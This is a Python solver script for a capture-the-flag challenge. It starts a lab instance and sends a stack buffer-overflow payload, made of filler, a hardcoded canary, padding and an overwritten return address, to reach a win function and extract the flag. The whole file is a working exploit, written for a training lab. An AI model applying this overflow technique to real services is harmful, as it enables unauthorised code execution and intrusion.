import sys, json, re, time, socket, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab

cy = CyLab(delay=0.8)
cy.login()
cy.req("PUT", "/api/challenges/260/instance/?source=library")
host = port = None
for _ in range(12):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/260/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"([A-Za-z0-9][A-Za-z0-9.\-]*\.net)\s+`?(\d{4,5})", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)
WIN = 0x08049236
canary = bytes.fromhex("42695264")
# buf(64) + canary(4) + x(4) + pad(4) + saved ebx(4) + saved ebp(4) + ret(4)
payload = b"A" * 64 + canary + b"B" * 4 + b"C" * 4 + b"D" * 4 + b"E" * 4 + struct.pack("<I", WIN)
print("payload:", len(payload), "octets")
for attempt in range(3):
    try:
        s = socket.create_connection((host, port), timeout=10)
        s.settimeout(6)
        buf = b""
        while b"> " not in buf:
            c = s.recv(4096)
            if not c:
                break
            buf += c
        s.sendall(str(len(payload)).encode() + b"\n" + payload)
        out = b""
        t0 = time.time()
        while time.time() - t0 < 8:
            try:
                c = s.recv(4096)
                if not c:
                    break
                out += c
            except socket.timeout:
                break
        s.close()
        txt = out.decode("latin-1", "replace")
        print("essai %d: %r" % (attempt + 1, txt[:300]))
        f = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
        if f:
            print("FLAG:", f.group(0))
            break
    except Exception as e:
        print("essai", attempt + 1, "ERR", type(e).__name__)
